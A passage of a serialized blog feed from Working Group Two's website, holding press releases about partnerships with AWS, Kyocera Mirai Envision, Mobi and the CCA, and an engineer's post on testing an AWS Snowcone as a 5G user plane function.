\'../components/imgWithCaption\'\\n\\n* Working Group Two and AWS collaborate to help telecom customers deploy mobile core in the cloud \\n* Working Group Two\u2019s core-as-a-service empowers mobile operators globally to grow their revenues, drive cost savings and achieve platform effects\\n\\n\x3c!--truncate--\x3e\\n\\n**Oslo, Norway \u2013 February 15 2023** \u2013 Working Group Two (WG2) and Amazon Web Services EMEA Sarl (AWS) are strengthening their collaboration by WG2 increasing AWS\u2019s cloud services to supply mobile core solutions as a service to telecoms and enterprise customers. This expands on the value AWS and WG2 deliver to help telecom operators accelerate their adoption and modernization in the cloud as well as enhance their ability to innovate. \\n\\nWG2 offers a modern core network delivered as a hosted service, which can help cost savings for mobile network operators. In substitution of complex and sub-scale core networks, WG2 allows operators to attach their radio networks to a global, common mobile core platform powered by services designed by AWS to be resilient and reliable. Operators are now able to procure, deploy and consume a 4G/5G/IMS core as-a-service, and focus purely on meeting customer demands. \\n\\nWG2\'s cloud-native core lowers the barriers of entry for network deployments by allowing operators to scale with use. Additionally, WG2\u2019s family of products utilizes the programmability of the core network to offer operators a marketplace of products and services they can bring to market without the need of building or integrating every product for each network.\\n\\nLeading operators such as [CK Hutchison\'s CKH IOD](https://www.wgtwo.com/blog/ckh-iod-wg2-public-cloud/) (Europe), Telenor\'s Vimla (Sweden), [Mobi](https://www.wgtwo.com/blog/mobi-expansion-with-wg2-aws/) (United States) and Telavox (Norway, Sweden) already rely on WG2 to host and manage their core networks for parts of their business. WG2 is also delivering private networks in collaboration with [Mitsui Knowledge Industry](https://www.wgtwo.com/blog/mitsui-knowledge-industry-mki-private-networks-business/) and [Kyocera Mirai Envision](https://www.wgtwo.com/blog/kcme-teams-up-with-wg2-for-private-networks/) in Japan. \\n\\nWG2 has spent the last seven years developing one of the world\u2019s first cloud-native programmable multi-tenant mobile core platforms. This provides all the key telecom core features needed for a full-service core, serving everything from smartphones in public networks to Internet of Things (IoT) devices in private networks. AWS and WG2 will collaborate on evolving WG2\u2019s control plane and user plane by leveraging AWS technologies. WG2 and AWS expect this collaboration to be beneficial for telco and enterprise customers that have an interest in modernizing their legacy platforms to cloud-native services and deploying mobile core solutions. \\n\\nAWS\u2019s Telco Director for EMEA, Fabio Cerone, commenting on WG2\u2019s collaboration, said:\\n> \u201cAlready telcos leveraging Working Group Two\u2019s cloud-native mobile core are gaining benefits of greater agility and faster time-to-market.  With the added support for IoT, Mobile Virtual Network Operators and Mobile Private Network use cases within the same platform, together AWS and WG2 will help telcos deliver even more value and services to their customers.\u201d\\n\\nWG2 CEO, Erlend Prestgard, said: \\n> \u201cThe growth we have been part of is now strengthened by our strategic collaboration with AWS, in order to scale and deliver more customer value than before. More companies are starting to see the real benefits of cloud, which has been long heralded as a catalyst for innovation and digital transformation, thanks to its ability to increase development speed and provide near-limitless scale. We are bringing the deep expertise of WG2 and AWS\u2019s powerful cloud services closer to our customers.\u201d\\n\\nMobi CEO, Justen Burdette, said:\\n> \\"We have set out to challenge the status quo in the wireless industry, and the strong relationship with WG2 has been instrumental in our ability to grow from \u2018just\u2019 a small regional wireless provider into a carrier that\u2019s able to do truly disruptive things \u2014 things that typically would take years and exponentially more capital investment.  Thanks to the capabilities we are able to tap into together, we are able to build a seamless, digital, app-first customer experience by leveraging the scalable, secure, and future-proof WG2 mobile core network, powered by AWS. By working with WG2, we are able to better serve our customers and create a brand that resonates with a rapidly growing, collaborative ecosystem of partners.\\" \\n\\n**About Working Group Two**  \\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. \\n\\n**Media Contact:**  \\nTor Odland  \\nWorking Group Two  \\n+47 9909 0872  \\ntor(at)wgtwo.com"},{"id":"kcme-teams-up-with-wg2-for-private-networks","metadata":{"permalink":"/blog/kcme-teams-up-with-wg2-for-private-networks","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-02-07-kcme-release/index.md","source":"@site/../blog/2023-02-07-kcme-release/index.md","title":"We\'re teaming up with Kyocera Mirai Envision to build private networks in Japan","description":"* Kyocera Mirai Envision Co., Ltd. (KCME) and Working Group Two (WG2) have signed an agreement to jointly develop and offer an end-to-end solution for private networks in Japan.","date":"2023-02-07T00:00:00.000Z","formattedDate":"February 7, 2023","tags":[{"label":"saas","permalink":"/blog/tags/saas"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"core","permalink":"/blog/tags/core"},{"label":"cloud","permalink":"/blog/tags/cloud"},{"label":"partners","permalink":"/blog/tags/partners"},{"label":"private networks","permalink":"/blog/tags/private-networks"},{"label":"press release","permalink":"/blog/tags/press-release"}],"readingTime":4.21,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"kcme-teams-up-with-wg2-for-private-networks","title":"We\'re teaming up with Kyocera Mirai Envision to build private networks in Japan","date":"2023-02-07T00:00:00.000Z","tags":["saas","operators","core","cloud","partners","private networks","press release"],"authors":["wgtwo"],"image":"./kyocera_featured_img.png"},"prevItem":{"title":"Working Group Two announces strategic collaboration with Amazon Web Services","permalink":"/blog/wg2-teams-up-with-aws-strategic-partnership"},"nextItem":{"title":"Mobi gears up for expansion delivered by Working Group Two on AWS","permalink":"/blog/mobi-expansion-with-wg2-aws"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n![](./Kyocera_logo_sm.svg.png)\\n\\n* Kyocera Mirai Envision Co., Ltd. (KCME) and Working Group Two (WG2) have signed an agreement to jointly develop and offer an end-to-end solution for private networks in Japan. \\n* The two companies aim to serve customers across the business and public sectors with a highly differentiated offering that tackles current industry challenges, such as high initial cost, difficulty of deploying cloud-based solutions, and slow adoption. \\n* Announcing first on-the-ground project with Sakaue Co. Ltd.\\n\\n\x3c!--truncate--\x3e\\n\\n**Kyocera Mirai Envision and Working Group Two unveil a differentiated private network offering in Japan.**\\n\\n[KCME](https://www.kcme.jp/), based in Japan, delivers solutions that integrate mobile and information communication technologies (ICT) in business areas, such as mobile internet, AI, IoT, big data, and virtual cloud. As part of the signed reseller agreement, KCME will leverage WG2\u2019s mobile-core-as-a-service to deliver private networks that rely on sXGP (a local standard for unlicensed LTE spectrum), pLTE (so-called Broadband Wireless Access, or BWA), and local 5G capabilities. WG2 offers a rebuilt, modern core network delivered as a hosted service. It drives the dual benefits of cost savings and revenue growth for KCME and their private network customers. Instead of using complex and subscale core networks, WG2 allows operators to attach their radio networks to a global, common mobile core platform powered by infrastructure from AWS. \\n\\nWG2\u2019s API-based product ecosystem relies on the programmability of the core network to offer KCME and their customers a marketplace of products and services they can bring to market without the need of building or integrating every product for each network.\\n\\nPotential customers include businesses using sXGP and/or local 5G. For sXGP, the offering from KCME and WG2 will mainly replace PHS systems (Personal Handyphone Systems) that are currently phasing out. Unlike PHS, which is a voice-only system, the LTE-based sXGP provides mobile broadband and IoT capabilities as part of the use cases. With local 5G, end customers would be able to start a radio DX with 5G capabilities. \\n\\nKCME and WG2\u2019s joint solution is also relevant for secondary integrators as part of their solution portfolio. [Synapse Co. Ltd.](https://www.synapse.jp), a local service provider based in Kagoshima City, has deployed the KCME-WG2 cloud solution on sXGP to an agricultural firm, [Sakaue Co. Ltd.](https://sakaue-farm.co.jp), based in Shibushi City, Kagoshima. This solution not only facilitates smartphone-based voice calls among employees, but also supports agricultural IoT sensing for temperature and soil conditions. \\n\\n<ImgWithCaption\\n  style={{\\n    width: \\"50%\\",\\n    float: \\"right\\",\\n    marginLeft:\\"20px\\"\\n  }}\\n  caption=\\"Agricultural illustration, courtesy Sakaue Co. Ltd.\\"\\n  src={require(\\"!file-loader!./sakaue-sm.png\\").default}\\n  />\\n\\nWith KCME-WG2\u2019s sXGP services, the customer has established a stable communication network across hundreds of different locations, even in areas that are not well-covered by national mobile network operators. This has enabled the implementation of Agricultural DX (digital technology to improve the efficiency and productivity of agricultural operations) within the same sXGP network.\\n\\nSaid Erlend Prestgard, CEO, Working Group Two:\\n> \u201cWe are excited to team up with KCME to jointly develop the market for private networks in Japan. By lowering the cost, reducing complexity, and speeding up the time to market, we can truly contribute to a differentiated solution in Japan. Utilizing a variety of spectrum options across multiple generations of telecommunications and multi-tenancy on AWS, we can support a wide range of customer needs,\\" \\n\\nSaid Hyungbae Kim, President and CEO of Kyocera Mirai Envision Co., Ltd.:\\n> \\"By collaborating with WG2, we are harnessing the power of cloud technology to revolutionize sXGP. Our efforts to streamline deployment and lower costs will accelerate the expansion of the private network market in Japan. Furthermore, by utilizing the programmable core network, we can differentiate and innovate, developing and delivering unique solutions that provide real value for our customers,\\" stated \\n\\n**About Kyocera Mirai Envision**  \\nKyocera Mirai Envision, a subsidiary of the Kyocera Group, began operations in 2011 with the goal of becoming a global company that helps create communities where people can live without disparity. We achieve this by offering optimized solutions that integrate mobile and ICT technology at their core. Our business includes not only the fields of mobile internet, AI, IoT, big data, and virtual cloud, which are the foundations of the information revolution, but also 5G, SDN, NFV, GPON, and related engineering. As a member of the Local SDGs Public-Private Partnership Platform, we are committed to working towards the achievement of the SDG \u201cCreating a Town to Live In.\u201d\\n\\nCompany name: Kyocera Mirai Envision Ltd.  \\nLocation: Mita 43 MT Building, 3-13-16 Mita, Minato-ku, Tokyo 108-0073, Japan  \\nRepresentative: President & CEO Hyungbae Kim  \\nEstablished: 1 April 2011  \\nURL: [https://www.kcme.jp/](https://www.kcme.jp/)  \\n\\n**About Working Group Two**  \\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. \\n\\n**Media Contact:**  \\nTor Odland  \\nWorking Group Two  \\n+47 9909 0872  \\ntor(at)wgtwo.com"},{"id":"mobi-expansion-with-wg2-aws","metadata":{"permalink":"/blog/mobi-expansion-with-wg2-aws","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-01-17-mobi-announcement/index.md","source":"@site/../blog/2023-01-17-mobi-announcement/index.md","title":"Mobi gears up for expansion delivered by Working Group Two on AWS","description":"* Hawaiian carrier Mobi is set to leverage the largest 5G network in the US","date":"2023-01-17T00:00:00.000Z","formattedDate":"January 17, 2023","tags":[{"label":"mobi","permalink":"/blog/tags/mobi"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"5G","permalink":"/blog/tags/5-g"},{"label":"regional","permalink":"/blog/tags/regional"},{"label":"USA","permalink":"/blog/tags/usa"},{"label":"press release","permalink":"/blog/tags/press-release"}],"readingTime":4.435,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"mobi-expansion-with-wg2-aws","title":"Mobi gears up for expansion delivered by Working Group Two on AWS","date":"2023-01-17T00:00:00.000Z","tags":["mobi","operators","5G","regional","USA","press release"],"authors":"wgtwo","image":"./logos_featured_img.png"},"prevItem":{"title":"We\'re teaming up with Kyocera Mirai Envision to build private networks in Japan","permalink":"/blog/kcme-teams-up-with-wg2-for-private-networks"},"nextItem":{"title":"Working Group Two steps up to support regional carriers in the United States","permalink":"/blog/joining-cca"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n![](./logos.png)\\n\\n* Hawaiian carrier Mobi is set to leverage the largest 5G network in the US \\n* Mobi makes strategic shift from legacy networks to deploy a cloud-native mobile core, fully managed as-a-Service\\n* Mobi selects WG2 for 4G/5G/IMS mobile core network deployed on infrastructure from AWS to realize rapid commercial launch \\n* Mobi disrupts the MVNO and 5G markets with differentiated service offering by tapping network APIs and global app development ecosystem\\n\\n\x3c!--truncate--\x3e\\n\\nHONOLULU (Hawai\u02bbi) and OSLO (Norway), January 17, 2023 - Mobi, a leading wireless provider in Hawai\u02bbi, is now expanding into the continental United States and beyond. [Mobi](https://www.mobi.com) is one of only four full mobile virtual network operators (MVNOs) in the United States, where they will leverage America\u2019s leading 5G network, with no territorial restrictions. A pilot solution goes live today.\\n\\nTo support a cost-effective, scalable and innovation-friendly expansion strategy, Mobi partnered with Working Group Two (WG2) to move its core network to the cloud. The WG2 mobile core runs cloud-natively on Amazon Web Services [(AWS)](https://aws.amazon.com/telecom/) and empowers Mobi to build a compelling, app-first customer experience on the largest 5G nationwide network. \\n\\nBy choosing a scalable and flexible cloud architecture, Mobi can offer more competitive rates and faster time-to-market with new services. The Network-as-a-Service approach reduces the time it takes to develop and deploy new features and upgrades. In contrast to legacy solutions, which include only a few network updates per year, Mobi will benefit from continuous, daily upgrades. Further, with a mobile core from WG2 that is agnostic to any generation of wireless, Mobi can future-proof its network with no end-of-life and continuous maintenance and support. \\n\\nWith a programmable, cloud-native core, Mobi will gain unprecedented flexibility, and will realize significantly faster time-to-market with new services.  Once the WG2 mobile core is integrated with the radio network, Mobi can leverage simple APIs to determine which services to activate for every SIM or user. The network is delivered fully as-a-service and the cost is based on consumption, defined by the number and type of users/SIM cards, changing as needs and traffic fluctuate. This allows for lower barriers of entry, and a core network that can scale from single users to hundreds of millions of users.\\n\\nSaid Justen Burdette, CEO of Mobi:\\n> \u201cOur ambition is to disrupt and challenge the status quo in the wireless industry by delivering a seamless, app-first, and engaging customer experience. By working with WG2 and AWS, we not only get access to a scalable, secure, and future-proof core network, we also improve our ability to meet the demands of our customers. It\u2019s all about making it simple to join, affordable to use, and fun to explore what our network can offer. We\u2019re building a brand that resonates with our customers by working with a strong ecosystem of partners.\\"\\n\\nSaid Erlend Prestgard, CEO of WG2:\\n> \u201cMobi is a standout example of a carrier that\u2019s ready to unlock the benefits of a network-as-a-service, achievable with a consistent, programmable mobile core running on the cloud. This allows them to go live in new geographical markets in record time. The simplicity of the as-a-service operating model means that Mobi can focus on meeting customer expectations and spend their time dreaming about innovation, rather than managing complexity. We\u2019re truly excited about joining Mobi on this journey.\\" \\n\\nSaid Fabio Cerone, Managing Director EMEA, Telco Business Unit at AWS:\\n> \u201cEmbracing the cloud helps carriers simplify network operations, deploy networks more rapidly, scale more easily - while still retaining full control over the network and gaining additional agility and innovation capabilities. Now the core network is only one API away from the global community of developers, which can help deliver new value for Mobi\u2019s customers.\\"\\n\\nAs an app-first company, wholly focused on user experience, Mobi embraces an open, API-enabled core network approach. Access to WG2\'s global ecosystem of developers offers Mobi a selection of pre-integrated, ready-to-deploy applications for voice, messaging and data services, built by WG2\u2019s development partners from all over the world. Following the continental U.S. rollout, Mobi also plans to leverage the same model to expand to markets including Canada, Puerto Rico and the U.S. Virgin Islands.\\n\\n**About Mobi**  \\nMobi, Inc. launched as the regional wireless provider for Hawai\u02bbi in 2005 \u2014 becoming the first carrier in the United States to offer affordable, simple, unlimited mobile service at a time when activation, overage, and hidden fees were the norm. Anyone can switch to Mobi in just seconds using the Mobi app, Apple Pay, and eSIM \u2014 with smart, friendly Mobi customer care geeks ready to help at any time digitally and at Mobi stores in Hawai\u02bbi. All Mobi team members are proudly represented by the Communications Workers of America (the CWA). Learn more at [mobi.com](https://www.mobi.com), or on [Facebook](https://fb.com/mobi), [Twitter](https://twitter.com/Mobi), or [LinkedIn](https://linkedin.com/company/mobi). \\n\\n**About Working Group Two**  \\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency \u2013 leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO, and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. \\n\\n**Media Contact:**  \\nTor Odland  \\nWorking Group Two  \\n+47 9909 0872  \\ntor(at)wgtwo.com"},{"id":"joining-cca","metadata":{"permalink":"/blog/joining-cca","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2023-01-09-cca/index.md","source":"@site/../blog/2023-01-09-cca/index.md","title":"Working Group Two steps up to support regional carriers in the United States","description":"(OSLO, NORWAY, JAN 9, 2023) \u2013 Working Group Two today announced it has joined Competitive Carriers Association (CCA) as it continues to build its presence in the United States.","date":"2023-01-09T00:00:00.000Z","formattedDate":"January 9, 2023","tags":[{"label":"cca","permalink":"/blog/tags/cca"},{"label":"operators","permalink":"/blog/tags/operators"},{"label":"5G","permalink":"/blog/tags/5-g"},{"label":"regional","permalink":"/blog/tags/regional"},{"label":"USA","permalink":"/blog/tags/usa"},{"label":"press release","permalink":"/blog/tags/press-release"}],"readingTime":2.51,"hasTruncateMarker":true,"authors":[{"name":"Everyone @ wgtwo","title":"\ud83c\udf55","url":"https://www.wgtwo.com","imageURL":"/img/author-photos/wgtwo.png","key":"wgtwo"}],"frontMatter":{"slug":"joining-cca","title":"Working Group Two steps up to support regional carriers in the United States","date":"2023-01-09T00:00:00.000Z","tags":["cca","operators","5G","regional","USA","press release"],"authors":"wgtwo"},"prevItem":{"title":"Mobi gears up for expansion delivered by Working Group Two on AWS","permalink":"/blog/mobi-expansion-with-wg2-aws"},"nextItem":{"title":"Unboxing the AWS Snowcone and using it as a local UPF","permalink":"/blog/exploring-aws-snowcone"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n(OSLO, NORWAY, JAN 9, 2023) \u2013 Working Group Two today announced it has joined Competitive Carriers Association (CCA) as it continues to build its presence in the United States. \\n\\nWG2 delivers a cloud-native 4G/5G core network as-a-service and as-a-platform for operators and developers. This drives the dual benefits of cost savings and revenue growth for the mobile industry. To help operators grow and differentiate, WG2 also offers a product marketplace that takes advantage of the programmable core network to create app stores of products for operators and users alike. \\n\\n\x3c!--truncate--\x3e\\n\\nErlend Prestgard, CEO of Working Group Two, said: \\n> \\"We believe this value proposition is ideal for the many regional operators across the United States, both those having to swap their networks, and those seeking to simplify and standardize their critical network operations. This allows CCA members to not only reduce complexity and save cost but focus on meeting customer needs and differentiating with new products and services.\u201d\\n\\nAs examples, some operators will want to move quickly to 5G, while others are focused on new service delivery such as multi-IMSI for watches with calls and messages. Other use cases include offering B2B products such as PBXs and customized network security products. \\n\\nWG2 has a proven track record of customer deployments in Europe, including CK Hutchison (multi-country), Telenor in Sweden and eRate in Norway. As perhaps the only vendor, it has been running its core live in the public cloud since 2018. The company is also delivering private networks in Japan in collaboration with Mitsui Knowledge Industry Co,. Ltd. KI. WG2\u2019s global core platform and product ecosystem runs on infrastructure from Amazon Web Services (AWS). \\n\\nTim Donovan, President and CEO of CCA, said:\\n> \u201cWe are delighted to welcome WG2 to CCA. CCA\u2019s associate members play an integral role in the competitive carrier ecosystem, and WG2\u2019s expertise and innovative solutions will certainly be a valuable addition for the entire membership.\u201d \\n\\n[CCA](https://www.ccamobile.org) is the nation\u2019s leading association for competitive wireless providers and stakeholders across the United States. \\n\\nWG2 will be present at the [CCA Mobile Carriers Show](https://www.ccamobile.org/cca-events#CCAEvents) in Pittsburgh, PA, May 2-4, 2023. \\n\\n**About Working Group Two**\\nWorking Group Two has rebuilt the mobile core for simplicity, innovation, and efficiency - leveraging the web-scale playbook and operating models. Today, Working Group Two innovation enables MVNO, MNO and Private Network Operators a secure, scalable, and reliable telco connectivity backbone that scales across all generations of mobile technologies. Our mission is to create programmable mobile networks to allow our customers and their end users to create more valuable and useful products and services. Read more at https://wgtwo.com\\n\\n**About CCA**\\nCCA is the nation\u2019s leading association for competitive wireless providers and stakeholders across the United States. Members range from small, rural carriers serving fewer than 5,000 customers to regional and nationwide providers serving millions of customers, as well as vendors and suppliers that provide products and services throughout the wireless communications ecosystem.\\n\\n**Media Contact:** \\nTor Odland\\nWorking Group Two\\n+47 9909 0872\\ntor(at)wgtwo.com"},{"id":"exploring-aws-snowcone","metadata":{"permalink":"/blog/exploring-aws-snowcone","editUrl":"https://github.com/working-group-two/wgtwo.com/edit/main/blog/../blog/2022-11-21-snowcone/index.md","source":"@site/../blog/2022-11-21-snowcone/index.md","title":"Unboxing the AWS Snowcone and using it as a local UPF","description":"The AWS Snowcone is a small form factor server that was originally meant for data transport to AWS data centers.","date":"2022-11-21T00:00:00.000Z","formattedDate":"November 21, 2022","tags":[{"label":"5G","permalink":"/blog/tags/5-g"},{"label":"aws","permalink":"/blog/tags/aws"},{"label":"snowcone","permalink":"/blog/tags/snowcone"}],"readingTime":7.875,"hasTruncateMarker":true,"authors":[{"name":"Holger Ihrig","title":"Software Engineer for Session Management & Protocol Termination","url":"https://www.linkedin.com/in/hihrig/","imageURL":"/img/author-photos/hi.jpg","key":"holger-ihrig"}],"frontMatter":{"slug":"exploring-aws-snowcone","title":"Unboxing the AWS Snowcone and using it as a local UPF","date":"2022-11-21T00:00:00.000Z","tags":["5G","aws","snowcone"],"authors":["holger-ihrig"]},"prevItem":{"title":"Working Group Two steps up to support regional carriers in the United States","permalink":"/blog/joining-cca"},"nextItem":{"title":"We have just completed our first VoNR (5G) calls in a multi-handset environment","permalink":"/blog/first-voice-calls-on-5g"}},"content":"import ImgWithCaption from \'../components/imgWithCaption\'\\n\\n\\nThe AWS Snowcone is a small form factor server that was originally meant for data transport to AWS data centers. \\nHowever it can also be used as a small device running compute workloads. We wanted to evaluate the performance of the \\nSnowcone as it is a quite intriguing piece of technology which we might want to use as a an on-premise UPF (User Plane \\nFunction) in low-throughput 5G networks (think IoT or Proof of Concept deployments).\\n\\n\x3c!--truncate--\x3e\\n\\nSpecs:\\n```\\nDimensions: 227 mm x 148.6 mm x 82.65 mm\\nWeight: 2,1 kg\\nvCPU(usable): 2\\nMemory(usable): 4GB\\nStorage(SSD): 14TB\\nNetwork: 2x10GB RJ45\\nDisplay: e-Ink for displaying shipping label or status\\nPower: 65W USB-C (not included)\\n```\\n\\n## Initial Setup\\n\\nOnce receiving the Snowcone it still displays the shipping label on the top of the unit. The IO Ports are hidden behind \\na flap at the back of the unit and the power switch including two LEDs are at the front of the unit.\\n\\nUpon powering it on, the Display will show the IP address of the Snowcone along with a message that the device is Locked\\nand needs to be unlocked using the AWS OpsHub Software which is available for Windows, OSx and Linux (AppImage).\\n\\n<img\\nwidth=\\"100%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Start.png\\").default}\\n/>\\n\\nIn our case we wanted to use a local device, so we selected this option\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Signin.png\\").default}\\n/>\\n\\nNext up was selecting a Snowcone Device followed by the following login screen\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./Opshub_Signin_configure.png\\").default}\\n/>\\n\\nAt this point you have to login to your AWS Console and navigate to the \u201cSnow Family\u201d Service where you should see \\na so-called JobID for a Snowcone. The Snowcone Job Details will let you get your Unlock Code and the Manifest File, \\nwhich are both needed to sign into the Snowcone device.\\n\\n<img\\nwidth=\\"100%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Local_Devices.png\\").default}\\n/>\\n\\nFrom that point on the Snowcone is usable. It did take a few more minutes though until it downloaded the AMI images \\nthat will run on the Snowcone.\\n\\n## Compute\\n\\nSince the Snowcone is very limited in resources, there are special Instance types for it:\\n- snc1.micro (1 vCPU, 1 GB RAM)\\n- snc1.small (1 vCPU, 2 GB RAM)\\n- snc1.medium (2 vCPU, 4GB RAM)\\n\\nAlso there are only two AMIs available for it now. However it is possible to import EBS Snapshots onto the Snowcone, \\nwhich we have not done as the procedure was too long and we could do with the AMIs provided.\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./OpsHub_Launch_Instance.png\\").default}\\n/>\\n\\n## Instance\\n\\nSince our use case was to run a UPF on it, we started the largest instance type the Snowcone would allow us and \\nstarted exploring.\\n\\nSince the available AMI is an Amazon Linux 2 AMI we were not super familiar with it. However, since it is Red Hat-based \\nwe kind of knew what to expect.\\n\\nThe kernel coming with that AMI was a 4.14 kernel, which was too old for us, so the first thing was updating to \\na 5.15 kernel. We followed this [guide](https://aws.amazon.com/premiumsupport/knowledge-center/amazon-linux-2-kernel-upgrade/) \\nfirst kind of sluggish and noticed that it\'s not a good idea to skip instructions, thereby bricking our instance. \\nWhich made us find out that there are no logs of the boot process or a webshell, like we are used to from EC2.\\n\\nSecond time\'s the charm though and we did have a working instance with a 5.15 kernel. Interestingly enough the \\ndevice key for SSH changed when upgrading from 4.14 to 5.4, but that was only a minor nuisance.\\nSo we thought let\'s do some exploring what we actually have here.\\n\\n<img\\nwidth=\\"60%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./Instance_lspci.png\\").default}\\n/>\\n\\nThere was not too much information here. So let\'s have a look at the CPU Information.\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./lscpu.png\\").default}\\n/>\\n\\nSo a CPU from the Xeon E3-12xx v2 line. Even though this might be the virtualization engine telling us that this is \\nthe CPU, we are assuming that it will be something from the Ivy Bridge line. Furthermore we are assuming that it will \\nbe a low-powered 4 Core CPU working there, where only 2 CPUs are available for the consumer.\\n\\nAfter digging a bit through dmidecode (we are engineers right?) we also found this additional piece of information\\n\\n<img\\nwidth=\\"70%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./dmidecode.png\\").default}\\n/>\\n\\nThe interesting part here is that the Manufacturer is designated as Bochs, which is a x86 and AMD64 emulator. \\nSo maybe it\'s not a virtualization engine driving the Instance, but an emulator?\\n\\nBut now back to our original plan to run a UPF (User Plane Function for 5G) on the Snowcone. For this to work we \\nneeded 2 network interfaces as our original plan was to use DPDK to run it. This is where we quickly found out that \\nan Instance on Snowcone can only have 1 Virtual Network Interface (VNI).\\n\\nAfter scouring through the documentation about Snowcone, we however found out that first of all there is another way \\nto configure the Snowcone. You can also configure the Snowcone with a CLI, the [SnowballEdgeClient](https://aws.amazon.com/snowball/resources/).\\n\\nIn there we found a different type of network Interface, the so called Direct Network Interface (DNI), and according \\nto documentation, the Snowcone supports up to 63 DNIs attached to it.\\nSo we created a DNI and attached it to our instance.\\nTo our surprise it showed up as an Intel X553 Virtual Network Function(VNF), so this is basically \\nSingle-Root IO-Virtualization (SRIOV) at work here. Which also makes sense because the X500 series supports up \\nto 64 VNFs (minus the one used by the snowcone itself).\\n\\nSo we started deploying our DPDK-based UPF on the snowcone. Creating a DNI and attaching it to an instance was fairly \\neasy with the SnowballEdgeClient. However, when restarting the instance, it would not come back. \\nAfter talking to AWS we were informed that this is a bug that is related with the interface naming and \\nshould be fixed in a future release.\\n\\nFor the meantime it can be circumvented by switching to [Predictable Network Interface Names](https://www.freedesktop.org/wiki/Software/systemd/PredictableNetworkInterfaceNames/).\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./change_to_predictable_NIC_Names.png\\").default}\\n/>\\n\\nOnce the DNI is attached to the instance, one has to do some additional configuration on the instance for both \\nthe VNI and DNI to get IP addresses. We found the relevant [guide](https://docs.aws.amazon.com/snowball/latest/developer-guide/network-config-ec2.html) \\nin the AWS Documentation and our DNI got an IP Address.\\n\\nWith those parts out of the way, we could deploy our DPDK-based UPF on the Snowcone and could use it as a UPF.\\n\\n## Performance\\n\\nEvaluating the performance of the Snowcone device was actually what triggered this whole exploration. So let\'s look mainly at the networking performance and also slightly at the cpu performance.\\n\\nFor this we are mainly using iperf3 to evaluate the throughput. The Snowcone as well as our test machine here in the lab have a Intel X55x 10Gbit NIC.\\n\\nWhen the Snowcone snc1.medium instance is the iperf Server:\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./iperf-server.png\\").default}\\n/>\\n\\nWhen the Snowcone snc1.medium instance is the iperf Client:\\n\\n<img\\nwidth=\\"80%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 10px\\"\\n}}\\nsrc={require(\\"!file-loader!./iperf-client.png\\").default}\\n/>\\n\\nFrom these very simple benchmarks we can already see that the EC2 instance is struggling with pushing out anywhere \\nnear line speed. In other words it seems like it is CPU bottlenecked. When running a htop while running this speedtest \\ndoes confirm that one of the CPUs hits 100% utilization every now and then. This makes sense because iperf3 is \\nsingle-threaded by design.\\n\\nWe then did run a speedtest to a local speedtest server using our userland UPF from a UE and this is basically \\nthe result.\\n\\n<img\\nwidth=\\"50%\\"\\nalign=\\"middle\\"\\nstyle={{\\ndisplay: \\"block\\",\\nmargin:\\"auto 